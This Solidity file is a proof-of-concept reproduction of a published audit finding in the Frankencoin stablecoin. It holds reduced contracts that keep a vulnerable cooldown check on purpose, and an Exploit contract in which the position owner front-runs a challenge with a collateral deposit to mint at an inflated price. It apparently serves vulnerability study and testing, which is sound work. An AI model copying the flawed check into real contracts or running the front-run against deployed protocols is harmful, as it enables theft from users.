// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin (ZCHF) — [H-03] When the challenge is successful, the user can
    send tokens to the position to avoid the position's cooldown period being
    extended (Code4rena 2023-04-frankencoin, finding #20018, reporter cccz).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: `internalWithdrawCollateral` only extends `cooldown` to
    `expiration` when the post-withdraw collateral balance is BELOW
    `minimumCollateral`. If the owner front-runs a successful challenge's
    settlement by transferring extra collateral into the position, the
    remaining balance stays ≥ minimum and the cooldown is NOT extended —
    so the owner can immediately mint at the inflated liquidation price that
    the challenge was meant to force into a long cooldown.

    Blamed body (Position.sol L268-276) is copied VERBATIM and marked
    `// @> VULN:`. Challenge period is 0 so `end` is callable without time
    travel. Cooldown starts already elapsed so minting is open before the
    challenge succeeds.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract CollateralToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal ZCHF stand-in (minted debt token).
contract ZCHF is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Position. Keeps the verbatim internalWithdrawCollateral
///         cooldown gate and a mint path gated by cooldown.
contract Position {
    address public owner;
    address public immutable hub;
    IERC20 public immutable collateral;
    ZCHF public immutable zchf;

    uint256 public immutable minimumCollateral;
    uint256 public immutable expiration;
    uint256 public cooldown;
    uint256 public price; // ZCHF per 1e18 collateral (simplified 1:1 units)
    uint256 public minted;
    uint256 public challengedAmount;

    constructor(
        address _owner,
        address _hub,
        address _collateral,
        address _zchf,
        uint256 _minimumCollateral,
        uint256 _price
    ) {
        owner = _owner;
        hub = _hub;
        collateral = IERC20(_collateral);
        zchf = ZCHF(_zchf);
        minimumCollateral = _minimumCollateral;
        expiration = block.timestamp + 3650 days;
        // Cooldown already elapsed — price was adjusted earlier; challenge period has run.
        cooldown = block.timestamp;
        price = _price;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    modifier onlyHub() {
        require(msg.sender == hub, "hub");
        _;
    }

    function collateralBalance() public view returns (uint256) {
        return collateral.balanceOf(address(this));
    }

    /// @notice Anyone can send collateral into the position (standard ERC20 transfer).
    function donateCollateral(uint256 amount) external {
        collateral.transferFrom(msg.sender, address(this), amount);
    }

    /// @notice Mint ZCHF against collateral at `price`, blocked while in cooldown.
    function mint(uint256 amountZCHF) external onlyOwner {
        require(block.timestamp >= cooldown, "cooldown");
        require(challengedAmount == 0, "challenged");
        // Simplified: 1e18 collateral supports `price` ZCHF.
        uint256 col = collateralBalance();
        require(col >= minimumCollateral, "min col");
        uint256 maxMint = (col * price) / 1e18;
        require(minted + amountZCHF <= maxMint, "limit");
        minted += amountZCHF;
        zchf.mint(msg.sender, amountZCHF);
    }

    function notifyChallengeStarted(uint256 size) external onlyHub {
        challengedAmount += size;
    }

    /// @notice Verbatim reduction of Position.internalWithdrawCollateral
    ///         (Position.sol L268-276). Cooldown extends ONLY if balance drops
    ///         below minimumCollateral after the transfer.
    function internalWithdrawCollateral(address target, uint256 amount) internal returns (uint256) {
        IERC20(collateral).transfer(target, amount);
        uint256 balance = collateralBalance();
        // @> VULN: cooldown only extended when balance < minimumCollateral — a
        // front-run deposit keeps balance ≥ minimum so this branch is skipped and
        // the owner can mint at the inflated price after a successful challenge.
        // FIX: always extend cooldown on successful challenge (e.g. 1 day).
        if (balance < minimumCollateral) {
            cooldown = expiration;
        }
        return balance;
    }

    function notifyChallengeSucceeded(address _bidder, uint256 /*_bid*/, uint256 _size)
        external
        onlyHub
        returns (address, uint256, uint256, uint256, uint32)
    {
        challengedAmount -= _size;
        uint256 colBal = collateralBalance();
        if (_size > colBal) {
            _size = colBal;
        }
        // volume = size at current price (simplified)
        uint256 volumeZCHF = (_size * price) / 1e18;
        uint256 repayment = minted < volumeZCHF ? minted : volumeZCHF;
        minted -= repayment;
        internalWithdrawCollateral(_bidder, _size);
        return (owner, volumeZCHF, volumeZCHF, repayment, 0);
    }
}

/// @notice Reduced MintingHub — challenge period 0 so end() is immediate.
contract MintingHub {
    struct Challenge {
        address challenger;
        Position position;
        uint256 size;
        uint256 end;
        address bidder;
        uint256 bid;
    }

    Challenge[] public challenges;

    function launchChallenge(Position position, uint256 _collateralAmount) external returns (uint256) {
        // Escrow challenger collateral is out of scope for this finding; we only
        // need the successful-challenge path that withdraws position collateral.
        uint256 pos = challenges.length;
        challenges.push(
            Challenge(msg.sender, position, _collateralAmount, block.timestamp, address(0), 0)
        );
        position.notifyChallengeStarted(_collateralAmount);
        return pos;
    }

    function end(uint256 _challengeNumber) public {
        Challenge storage challenge = challenges[_challengeNumber];
        require(challenge.challenger != address(0x0));
        require(block.timestamp >= challenge.end, "period has not ended");
        address recipient = challenge.bidder == address(0x0) ? msg.sender : challenge.bidder;
        challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size);
        delete challenges[_challengeNumber];
    }
}

/// @notice Owner front-runs a successful challenge with a collateral top-up so
///         cooldown is not extended, then mints at the inflated price.
contract Exploit {
    uint256 public constant MIN_COL = 1e18;
    uint256 public constant PRICE = 1000e18; // 1000 ZCHF per 1 WETH (inflated after adjustPrice)
    uint256 public constant MINT_AMOUNT = 1000e18;

    CollateralToken public col;
    ZCHF public zchf;
    MintingHub public hub;
    Position public position;

    uint256 public mintedAfterChallenge;
    uint256 public cooldownAfterChallenge;

    constructor() {
        // Fixed CREATE order:
        col = new CollateralToken(); //        nonce 1
        zchf = new ZCHF(); //                  nonce 2
        hub = new MintingHub(); //             nonce 3
        position = new Position( //            nonce 4
            address(this), address(hub), address(col), address(zchf), MIN_COL, PRICE
        );
        // Position holds exactly minimum collateral (challenge covers it all).
        col.mint(address(position), MIN_COL);
        // Owner holds a matching top-up to front-run with.
        col.mint(address(this), MIN_COL);
    }

    function run() external {
        // 1. Challenge the full collateral (period already ended — end=now).
        uint256 id = hub.launchChallenge(position, MIN_COL);

        // 2. Owner MEV-front-runs end(): send 1 WETH into the position so the
        //    post-withdraw balance stays ≥ minimumCollateral.
        col.approve(address(position), MIN_COL);
        position.donateCollateral(MIN_COL);
        require(position.collateralBalance() == 2 * MIN_COL, "top-up missing");

        // 3. Challenge settles: withdraws 1 WETH to the settler; 1 WETH remains.
        hub.end(id);
        require(position.collateralBalance() == MIN_COL, "unexpected remaining col");

        // 4. BUG: cooldown was NOT extended because balance stayed ≥ minimum.
        cooldownAfterChallenge = position.cooldown();
        require(cooldownAfterChallenge != position.expiration(), "cooldown wrongly extended");
        require(block.timestamp >= cooldownAfterChallenge, "still cooling");

        // 5. Owner mints the full inflated amount immediately — the successful
        //    challenge was supposed to lock minting until expiration.
        position.mint(MINT_AMOUNT);
        mintedAfterChallenge = zchf.balanceOf(address(this));

        // HARM: inflated mint succeeds after a successful challenge because the
        // front-run deposit bypassed the cooldown extension.
        require(mintedAfterChallenge == MINT_AMOUNT, "harm: mint failed / wrong amount");
        require(position.minted() == MINT_AMOUNT, "harm: position debt not recorded");
    }
}
